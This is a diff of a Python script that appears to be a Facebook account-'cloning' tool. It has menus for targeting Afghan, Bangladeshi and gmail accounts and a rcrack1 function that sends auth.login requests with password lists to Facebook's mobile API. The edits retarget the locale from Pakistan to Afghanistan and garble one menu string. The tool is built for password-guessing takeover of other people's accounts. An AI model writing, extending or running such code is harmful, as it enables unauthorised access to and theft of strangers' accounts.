@@ -529,7 +529,7 @@ def menu():
 		public()
 	elif xd in ['4','04']:
 		clear()
-		print(' [1] Afghanistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
+		print(' [1] Afghanistan cloning\n [2] AFG Random cloning\n [3] gmail cloning\n [0] Back menu')
 		linex()
 		x=input(' Choose: ')
 		if x in ['1','01']:
@@ -567,7 +567,7 @@ def pak():
 		except ValueError:
 			limit = 5000
 		linex()
-		print(' [1] Method 1\n [2] Method 2 Best ')
+		print(' [1] Method 1\Best [2] Method 2 Best ')
 		linex()
 		mthd = input(' Choose: ')
 		linex()
@@ -796,8 +796,8 @@ def rcrack1(ids,passlist):
 			'advertiser_id':adid,
 			'encrypted_msisdn':'',
 			'currently_logged_in_userid':'0',
-			'locale':'en_PK',
-			'client_country_code':'PK',
+			'locale':'en_AFG',
+			'client_country_code':'AFG',
 			'method':'auth.login',
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
